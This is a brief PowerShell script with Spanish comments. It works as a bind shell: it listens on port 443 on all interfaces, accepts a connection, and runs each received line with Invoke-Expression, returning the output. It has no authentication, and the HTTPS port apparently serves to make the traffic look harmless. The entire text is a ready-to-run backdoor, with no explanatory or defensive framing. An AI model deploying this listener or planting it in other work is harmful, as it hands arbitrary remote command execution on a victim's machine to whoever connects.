$listener = New-Object System.Net.Sockets.TcpListener ([System.Net.IPAddress]::Any, 443)
$listener.Start()

Write-Host "Esperando conexión..."
$client = $listener.AcceptTcpClient()
$stream = $client.GetStream()
$reader = New-Object System.IO.StreamReader $stream
$writer = New-Object System.IO.StreamWriter $stream
$writer.AutoFlush = $true

try {
    while ($true) {
        $command = $reader.ReadLine()
        if ($command -eq "exit") { break }

        if ($command -eq "dir") {
            $output = Get-ChildItem | ForEach-Object { $_.Name } | Out-String
            $writer.WriteLine($output)
        } else {
            $output = Invoke-Expression $command
            $writer.WriteLine($output)
        }
    }
} catch {
    # Manejar cualquier error que pueda ocurrir durante la comunicación
    Write-Host "Error: $_"
}

$writer.Close()
$reader.Close()
$stream.Close()
$client.Close()
$listener.Stop()


